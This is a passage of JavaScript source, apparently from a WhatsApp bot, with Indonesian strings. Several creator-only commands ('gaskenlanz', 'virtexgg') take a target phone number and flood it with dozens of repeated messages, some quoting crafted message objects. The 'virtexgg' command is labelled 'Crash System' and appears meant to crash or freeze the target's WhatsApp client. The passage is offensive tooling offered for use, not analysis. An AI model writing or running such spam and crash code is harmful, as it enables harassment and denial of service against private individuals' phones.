await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '👑𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨 𝐓𝐨𝐩'}, {quoted:lanzbatosai})
await sleep(2000)
m.reply(`*UDAH DI SEND YA BROK*`)
break

case 'gaskenlanz': case 'lanzmodesad': 
if (!isCreator) return m.reply(global.nocreator)
if (!q) return m.reply('Masukkan Nomor Target')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzelitcees})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzelitcees})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: '🔥🔥Menyala Abangkuuuu'}, {quoted:lanzbatosai})
await sleep(2000)
m.reply(`*UDAH DI SEND YA BROK*`)
break

case 'virtexgg': 
if (!isCreator) return m.reply(global.nocreator)
if (!q) return m.reply('Masukkan Nomor Target')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzelitcees})
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzelitcees})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
await sleep(2000)
qio.sendMessage(Pe, {text: `⃟A̶l̶w̶a̶y̶s̶a̶q̶i̶o̶o̶ C̶r̶a̶s̶h̶ S̶y̶s̶t̶e̶m̶⃠`}, {quoted:lanzbatosai})
